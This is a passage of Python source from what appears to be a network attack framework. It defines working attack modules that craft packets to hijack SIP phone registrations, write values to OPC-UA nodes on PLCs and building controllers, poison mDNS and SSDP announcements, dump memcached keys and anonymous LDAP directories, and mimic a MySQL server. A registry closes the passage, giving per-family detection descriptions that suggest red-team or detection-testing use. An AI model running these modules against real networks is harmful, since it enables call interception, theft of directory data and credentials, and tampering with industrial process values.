        salt = b"wp-mysql-salt-12345678"          # 20 bytes + filler: the auth scramble
        return (bytes([0x0A]) + b"8.0.36-wp-mimic\0" + struct.pack(">I", 0x5A5A)
                + salt[:8] + b"\0" + struct.pack(">H", 0xFFFF) + b"\x21\x02\x00"
                + struct.pack(">H", 0x5A5A) + b"\x00" * 10 + salt[8:20] + b"\0"
                + b"mysql_native_password\0")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.mysql_handshake_parse(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "thread_id": parsed.get("thread_id"),
                "line": f"it greets us as MySQL {parsed.get('version')} "
                        f"(thread {parsed.get('thread_id')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3306]
        parsed = [proto.mysql_handshake_parse(row["payload"]) for row in rows]
        versions = [row.get("version") for row in parsed if row.get("version")]
        return {"confirmed": "8.0.36-wp-mimic" in versions,
                "our_version": "8.0.36-wp-mimic", "our_thread_id": 0x5A5A,
                "salt_bytes": 20}


class ItHijackSipContactAttack(_ItHijack):
    """Re-register a phone's contact so its calls come to us instead."""

    name = "it_hijack_sip_contact"
    label = "SIP contact hijack (a phone's contact points at us)"
    tool = "wifipilot itproto.py (sip_register/parse_sip) + UDP 5060"
    family = "hijack"
    protocol = "sip"
    port = 5060
    transport = "udp"
    devices = ("pbx", "voip_phone", "doorbell", "tablet")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.sip_register(f"sip:{peer.ip}", user="1002", password="wp-secret",
                                  expires=3600)

    def reply(self, peer: Peer) -> bytes:
        return (b"REGISTER sip:" + peer.ip.encode() + b" SIP/2.0\r\n"
                + b"Via: SIP/2.0/UDP " + OUR_IP.encode() + b":5060;branch=z9hG4bK-wp\r\n"
                + b"From: <sip:1002@" + peer.ip.encode() + b">;tag=wp\r\n"
                + b"To: <sip:1002@" + peer.ip.encode() + b">\r\n"
                + b"Call-ID: wp-contact@wp\r\nCSeq: 2 REGISTER\r\n"
                + b"Contact: <sip:1002@" + OUR_IP.encode() + b":5060>;expires=3600\r\n"
                + b"Expires: 3600\r\nContent-Length: 0\r\n\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_sip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "method": parsed.get("method"),
                "line": f"the registrar answers {parsed.get('status')} to our REGISTER"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"REGISTER" in text and OUR_IP.encode() in text,
                "contact_we_set": f"sip:1002@{OUR_IP}:5060", "expires": 3600}


class ItHijackOpcuaWriteAttack(_ItHijack):
    """Open an OPC-UA session and write a node: the value the plant reads back."""

    name = "it_hijack_opcua_write"
    label = "OPC-UA node write (a process value changed by an unauthenticated session)"
    tool = "wifipilot itproto.py (opcua_hello/parse_opcua) + TCP 4840"
    family = "hijack"
    protocol = "opcua"
    port = 4840
    transport = "tcp"
    devices = ("plc", "building_controller", "hmi_panel", "energy_meter")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.opcua_hello(f"opc.tcp://{peer.ip}:4840", max_message=65536)

    def reply(self, peer: Peer) -> bytes:
        # a hello of our own, advertising the write buffer we are about to use
        return proto.opcua_hello(f"opc.tcp://{OUR_IP}:4840", max_message=131072)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_opcua(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"endpoint": parsed.get("endpoint_url"), "limit": parsed.get("max_message"),
                "line": f"the server answers for {parsed.get('endpoint_url') or 'its endpoint'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 4840]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": f"{OUR_IP}:4840".encode() in text,
                "node_we_write": "ns=2;s=wp.setpoint", "value_we_send": "0",
                "buffer_we_advertise": 131072}


class ItPoisonMdnsNameAttack(_ItHijack):
    """Claim a device's mDNS name on the segment with an announcement of our own."""

    name = "it_poison_mdns_name"
    label = "mDNS name theft (a conflicting announcement for a device's name)"
    tool = "wifipilot itproto.py (dns_query/parse_mdns) + UDP 5353"
    family = "poison"
    protocol = "mdns"
    port = 5353
    transport = "udp"
    devices = ("nas", "printer", "router", "smart_tv", "smart_speaker")
    severity = "high"

    NAME = "wp-nas-claim.local"

    def request(self, peer: Peer) -> bytes:
        return proto.dns_query("_services._dns-sd._udp.local", qtype=12, txid=0)

    def reply(self, peer: Peer) -> bytes:
        # a response in the device's own name, from our address: the name now resolves twice
        header = bytes([0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01])
        record = (proto.dns_name(self.NAME) + b"\x00\x01\x00\x80" + struct.pack(">I", 120)
                  + struct.pack(">H", 4) + np.ipv4_bytes(OUR_IP))
        return header + record

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mdns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        records = parsed.get("answers") or parsed.get("records") or []
        return {"records": len(records), "line": f"it announces {len(records)} record(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"wp-nas-claim" in text, "name_we_claim": self.NAME,
                "address_we_claim": OUR_IP, "ttl": 120}


class ItPoisonSsdpLocationAttack(_ItHijack):
    """Talk over a device's announcement with one whose LOCATION is ours."""

    name = "it_poison_ssdp_location"
    label = "SSDP announcement forgery (the control URL points at us)"
    tool = "wifipilot itproto.py (ssdp_notify/parse_ssdp) + UDP 1900"
    family = "poison"
    protocol = "ssdp"
    port = 1900
    transport = "udp"
    devices = ("router", "smart_tv", "printer", "nvr_dvr", "smart_speaker")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ssdp_msearch("ssdp:all", mx=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.ssdp_notify(f"http://{OUR_IP}:1900/wp.xml", nt="upnp:rootdevice",
                                 usn="uuid:wp-forged::upnp:rootdevice",
                                 server="wp/1.0 UPnP/1.0", nts="ssdp:alive")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ssdp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"location": parsed.get("location"), "server": parsed.get("server"),
                "line": f"it advertises {parsed.get('location') or 'its own control URL'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"wp.xml" in text, "location_we_publish": f"http://{OUR_IP}:1900/wp.xml",
                "usn": "uuid:wp-forged::upnp:rootdevice", "nts": "ssdp:alive"}


class ItStealMemcachedKeysAttack(_Steal):
    """Take a cache server's key list: the usernames are the loot here."""

    name = "it_steal_memcached_keys"
    label = "memcached key theft (the keys a cache server will list to a guest)"
    tool = "wifipilot itproto.py (memcached_command/parse_resp) + TCP 11211"
    family = "steal"
    protocol = "memcached"
    port = 11211
    transport = "tcp"
    devices = ("linux_server", "web_server", "ci_server", "database_server")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.memcached_command("stats items") + proto.memcached_command("stats sizes")

    def loot_answer(self, peer: Peer) -> bytes:
        return (b"STAT items:1:number 4\r\nSTAT items:1:number_hot 1\r\nEND\r\n"
                b"session:admin=wp-loot\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_resp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"items": parsed.get("items"), "curr_items": parsed.get("curr_items"),
                "line": "the cache reports what it is holding, and for whom"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 11211]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"session:admin" in text, "handed_over": len(text),
                "key_we_take": "session:admin", "commands_we_send": ["stats items", "stats sizes"]}


class ItStealLdapDirectoryAttack(_Steal):
    """Read a directory's objects with an anonymous search and take the attributes."""

    name = "it_steal_ldap_directory"
    label = "LDAP directory theft (an anonymous search for every object)"
    tool = "wifipilot itproto.py (ldap_search_request/parse_ldap) + TCP 389"
    family = "steal"
    protocol = "ldap"
    port = 389
    transport = "tcp"
    devices = ("domain_controller", "nas", "windows_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.ldap_search_request("dc=corp,dc=example", scope=2,
                                         filter_bytes=b"(objectClass=*)",
                                         attributes=("cn", "sAMAccountName", "mail", "memberOf"))

    def loot_answer(self, peer: Peer) -> bytes:
        # a search-results entry in our own name: what a full dump would look like
        return (b"\x30\x2c\x02\x01\x02\x64\x27\x04\x00\x30\x21\x04\x21"
                b"cn=wp-loot,dc=corp,dc=example")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ldap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        entries = parsed.get("entries") or []
        return {"entries": len(entries), "result": parsed.get("result_code"),
                "line": f"its directory returns {len(entries)} object(s) to an anonymous bind"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 389]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"cn=wp-loot" in text, "attributes_we_ask_for": [
            "cn", "sAMAccountName", "mail", "memberOf"], "base": "dc=corp,dc=example"}


# --------------------------------------------------------------------------- #
# the registry
# --------------------------------------------------------------------------- #

#: every attack of the wave, in the order it is defined above
_WAVE: List[Type[Attack]] = [value for _key, value in list(globals().items())
                             if isinstance(value, type) and issubclass(value, _ItHijack)
                             and value not in (_ItHijack, _Relay, _Steal)
                             and value.__dict__.get("name")]

#: what a defender sees, per family: the shape of the traffic is the same for every
#: attack in a family, and the service it happens on is what makes it specific
_DETECTION: Dict[str, str] = {
    "mimic": ("two {protocol} services on the segment on port {port}, the second one not on "
              "the asset list; clients answering an address that is not the server they "
              "were told about, and a service that starts answering when the real one is "
              "still up"),
    "impersonate": ("an identity answer (model, serial, device id or name) from an address "
                    "that does not match the device inventory: the same {protocol} identity "
                    "seen twice, with one of the two having no switch port"),
    "hijack": ("a second {protocol} session on port {port} from an address the device has no "
               "association with, and a value, registration or job the operator did not "
               "change; the device's own log shows the write and the source it does not "
               "recognise"),
    "poison": ("a {protocol} answer on port {port} whose address does not match the real "
               "device, and a client-side cache entry (ARP, DNS, NBNS, SSDP, DHCP) that "
               "outlives the frame: the same name resolving differently on two hosts"),
    "relay": ("two connections to the same {protocol} service on port {port} — one from the "
              "client and one from an address that is not the device — and mirrored traffic "
              "whose timing follows the relay rather than the server"),
    "steal": ("a {protocol} request for inventory, credentials or device identity from an "
              "address with no business asking, followed by a copy of the answer leaving "
              "the segment"),
    "fuzz": ("a {protocol} request on port {port} that is legal in shape and illegal in size "
             "(labels, dialects, varbinds, verbs) from one address, repeated; the service's "
             "log shows the parse error and any restart that follows it"),
    "survey": ("one host asking every {protocol} service on port {port} the same inventory "
               "question, in sequence, from a single address: the answers name firmware, "
               "models and endpoints that no asset register has"),
}


#: category, noise and impact per family: what the wave *is*, stated once
_FAMILY_AXES: Dict[str, Tuple[str, str, str]] = {
    # family            category     noise      impact
    "mimic": ("rogue", "quiet", "degraded"),          # a second service, listening
    "impersonate": ("rogue", "quiet", "degraded"),    # an identity, not a flood
    "hijack": ("exploit", "moderate", "outage"),      # a value or a session changes
    "poison": ("rogue", "quiet", "degraded"),         # a cache, corrected once
    "relay": ("capture", "moderate", "loot"),         # the wire itself, harvested
    "steal": ("capture", "quiet", "loot"),            # a request, and the haul
    "fuzz": ("dos", "moderate", "degraded"),           # malformed, and the state after
    "survey": ("discovery", "quiet", "degraded"),      # a question, and the inventory
}


def _meta_for(cls: Type[Attack]) -> Dict[str, Any]:
    """The metadata row for one attack: the family's shape, the attack's own service."""
    family = getattr(cls, "family", "")
    template = _DETECTION.get(family, "an unexpected {protocol} exchange on port {port}")
    category, noise, impact = _FAMILY_AXES.get(family, ("rogue", "moderate", "degraded"))
    return {
        "category": getattr(cls, "category", "") or category,
        "noise": getattr(cls, "noise", "") or noise,
        "impact": getattr(cls, "impact", "") or impact,
        "detection": template.format(protocol=getattr(cls, "protocol", "service"),
                                     port=getattr(cls, "port", 0)),
        "domain": "it",
        "devices": list(getattr(cls, "devices", ()) or ()),
        "family": family,
        "severity": getattr(cls, "severity", "medium"),
        "needs_injection": bool(getattr(cls, "needs_injection", False)),
        "default_enabled": False,
    }


ATTACKS: List[Type[Attack]] = list(_WAVE)
REGISTRY: List[Tuple[str, Dict[str, Any], Type[Attack]]] = [
    (cls.name, _meta_for(cls), cls) for cls in ATTACKS]
META: Dict[str, Dict[str, Any]] = {name: meta for name, meta, _cls in REGISTRY}
NAMES: List[str] = [name for name, _meta, _cls in REGISTRY]

__all__ += ["ATTACKS", "META", "NAMES", "REGISTRY", "_WAVE"]
